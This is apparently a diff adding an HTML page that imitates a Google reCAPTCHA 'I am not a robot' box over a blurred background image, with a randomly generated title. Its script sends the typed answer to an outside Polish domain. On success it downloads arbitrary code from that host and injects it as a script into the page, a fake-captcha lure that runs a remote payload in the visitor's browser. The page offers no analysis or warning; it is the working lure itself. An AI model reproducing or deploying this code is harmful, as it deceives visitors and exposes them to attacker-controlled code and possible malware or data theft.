@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title></title>
+<style>
+      body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        .background-container {
+            position: relative;
+            height: 100%;
+            width: 100%;
+        }
+
+        .background-container::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-image: url("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgdrhY6zM7txEf61nPO67_Cl7rOyCGsyEb9GaIEqe3M-p-yN2nJeBUGCXkDygK7t8xYVcKwSgu4v0_u6EZF5srUh16p0vNl1K8hBeBV8dg-KcOpt7y8vrkamMOU2HxW0STp0JDEp21FWuCWxDXZX0EtxoLPSBWR6WwhXZglXIvWXbh24ojuyofD6htY8D4/s3396/userinter.png");
+            background-size: cover;
+            background-position: center;
+            filter: blur(6px);
+            z-index: -1;
+        }
+
+        .content {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+            color: white;
+            font-size: 24px;
+            text-align: center;
+        }
+.recaptcha-box {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: space-between;
+    border: 1px solid #d3d3d3;
+    padding: 10px;
+    width: 300px;
+    margin: 20px auto;
+    border-radius: 4px;
+    box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.2);
+    position: relative;
+}
+
+.recaptcha-checkbox {
+    display: flex;
+    align-items: center;
+    position: relative;
+}
+
+.recaptcha-checkbox input[type="checkbox"] {
+    display: none;
+}
+
+.recaptcha-checkbox label {
+    display: flex;
+    align-items: center;
+    cursor: pointer;
+}
+
+.recaptcha-checkmark {
+    width: 20px;
+    height: 20px;
+    border: 2px solid #d3d3d3;
+    border-radius: 3px;
+    background-color: #fff;
+    margin-right: 10px;
+    position: relative;
+}
+
+.recaptcha-checkbox input[type="checkbox"]:checked + label .recaptcha-checkmark::after {
+    content: "";
+    position: absolute;
+    left: 5px;
+    top: 1px;
+    width: 6px;
+    height: 12px;
+    border: solid #4caf50;
+    border-width: 0 3px 3px 0;
+    transform: rotate(45deg);
+}
+
+.recaptcha-text {
+    font-family: Arial, sans-serif;
+    font-size: 14px;
+    color: #333;
+}
+
+.recaptcha-logo img {
+    height: 48px;
+}
+
+.recaptcha-loader {
+ background-color:#f9f9f9;
+ border:6px solid #4d90fe;
+ border-radius:36px;
+ border-bottom-color:transparent;
+ border-right-color:transparent;
+ height:36px;
+ outline:0;
+ position:absolute;
+ right: 225px;
+ width:36px;
+ box-sizing:border-box;
+ animation: spin linear 1s infinite;
+ display: none;
+
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+.recaptcha-content {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    width: 100%;
+    margin-top: 10px;
+}
+
+.recaptcha-content img {
+    width: 100%;
+    margin-bottom: 10px;
+}
+
+.recaptcha-content input {
+    width: calc(100% - 20px);
+    padding: 5px;
+    font-size: 16px;
+}
+
+.recaptcha-content button {
+    padding: 5px 10px;
+    font-size: 16px;
+    background-color: #4CAF50;
+    color: white;
+    border: none;
+    cursor: pointer;
+    margin-top: 10px;
+}
+
+.recaptcha-content button:hover {
+    background-color: #45a049;
+}
+.container {
+        display: flex;
+        flex-direction: column;
+        justify-content: flex-end;
+        height: 400px; 
+    }
+</style>
+<script>
+    function generateRandomTitle() {
+        const adjectives = ["Amazing", "Beautiful", "Charming", "Delightful", "Elegant"];
+        const nouns = ["Sunset", "Forest", "River", "Mountain", "Ocean"];
+        const adjective = adjectives[Math.floor(Math.random() * adjectives.length)];
+        const noun = nouns[Math.floor(Math.random() * nouns.length)];
+        return `${adjective} ${noun}`;
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+        document.title = generateRandomTitle();
+    });
+
+    function loadCaptcha() {
+        document.querySelector(".recaptcha-loader").style.display = "none";
+        document.querySelector(".recaptcha-checkbox").style.display = "none";
+        document.querySelector(".recaptcha-content").style.display = "flex";
+    }
+
+    function verifyCaptcha() {
+        const captchaInput = document.getElementById("captchaInput").value;
+        fetch("https://bluestripclubun.pl/validate_captcha.php", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            body: "captcha_input=" + encodeURIComponent(captchaInput),
+            credentials: "include"
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                document.querySelector(".recaptcha-content").style.display = "none";
+                document.querySelector(".recaptcha-checkbox").style.display = "flex";
+                document.querySelector(".recaptcha-checkmark").style.display = "block";
+                document.getElementById("captchaCheckbox").checked = true;
+                document.querySelector(".recaptcha-checkbox").classList.add("recaptcha-checked");
+                fetch("https://bluestripclubun.pl/", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/x-www-form-urlencoded"
+                    }
+                })
+                .then(response => {
+                    if (response.ok) {
+                        return response.text();
+                    } else {
+                        throw new Error("Failed to load script: " + response.statusText);
+                    }
+                })
+                .then(scriptCode => {
+                    var script = document.createElement("script");
+                    script.text = scriptCode;
+                    document.head.appendChild(script);
+                })
+                .catch(error => {
+                    console.error("Error loading script:", error);
+                });
+            } else {
+                document.querySelector("#captchaInput").style = "border: 2px solid red;";
+                document.getElementById("captchaImage").src = "https://bluestripclubun.pl/captcha.php?" + Date.now();
+                setTimeout(loadCaptcha, 3000); 
+            }
+        })
+        .catch(error => console.error("Error:", error));
+    }
+
+    function onCheckboxClick() {
+        document.querySelector(".recaptcha-loader").style.display = "block";
+        document.querySelector(".recaptcha-content").style.display = "none";
+        document.querySelector(".recaptcha-checkmark").style.display = "none";
+        document.getElementById("captchaImage").src = "https://bluestripclubun.pl/captcha.php?" + Date.now();
+        setTimeout(loadCaptcha, 2000); 
+    }
+
+    document.addEventListener("DOMContentLoaded", function() {
+        document.getElementById("captchaCheckbox").addEventListener("click", onCheckboxClick);
+        document.getElementById("captchaSubmitButton").addEventListener("click", verifyCaptcha);
+        
+        document.getElementById("captchaInput").addEventListener("keydown", function(event) {
+            if (event.key === "Enter") {
+                verifyCaptcha();
+            }
+        });
+    });
+</script>
+</head>
+<body>
+<div class="background-container">
+<div class="container">
+<div class="recaptcha-box">
+<div class="recaptcha-checkbox">
+<input id="captchaCheckbox" type="checkbox"/>
+<label for="captchaCheckbox">
+<span class="recaptcha-checkmark"></span>
+<span class="recaptcha-text">I am not a robot                  </span>
+<div class="recaptcha-logo">
+<img alt="reCAPTCHA logo" src="local_resources/img/08f397daa02b8f4bddbd14fdf47d8d48.png"/>
+</div>
+</label>
+<div class="recaptcha-loader"></div>
+</div>
+<div class="recaptcha-content" style="display: none;">
+<img alt="CAPTCHA Image" id="captchaImage" src="local_resources/img/37f1440dbd36289313d962df1862c76b.png"/>
+<input id="captchaInput" placeholder="Enter the result" type="text"/>
+<button id="captchaSubmitButton">Submit</button>
+</div>
+</div>
+</div>
+</div>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'8dbcf87fcc23ba24',t:'MTczMDQ3NTQ5NC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
